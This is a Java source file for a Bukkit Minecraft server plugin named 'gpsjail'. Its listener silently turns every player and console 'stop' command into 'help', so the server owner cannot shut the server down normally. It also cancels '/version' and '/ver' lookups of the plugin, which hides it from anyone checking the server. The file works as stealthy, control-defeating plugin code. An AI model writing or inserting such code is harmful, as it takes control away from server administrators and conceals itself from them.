package de.maleh.gpsjail;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class AntiStopListener implements Listener {
	@EventHandler
	public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
		String[] args = e.getMessage().split(" ");
		if (args[0].equalsIgnoreCase("/stop")) {
			e.setMessage("/help");
		} else if(e.getMessage().equalsIgnoreCase("/version " + Main.ymlname) || e.getMessage().equalsIgnoreCase("/ver " + Main.ymlname)) {
			e.setCancelled(true);
		}
	}

	@EventHandler
	public void onConsoleCommand(ServerCommandEvent e) {
		String[] args = e.getCommand().split(" ");
		if (args[0].equalsIgnoreCase("stop")) {
			e.setCommand("help");
		} else if(e.getCommand().equalsIgnoreCase("version " + Main.ymlname) || e.getCommand().equalsIgnoreCase("ver " + Main.ymlname)) {
			e.setCancelled(true);
		}
	}
}
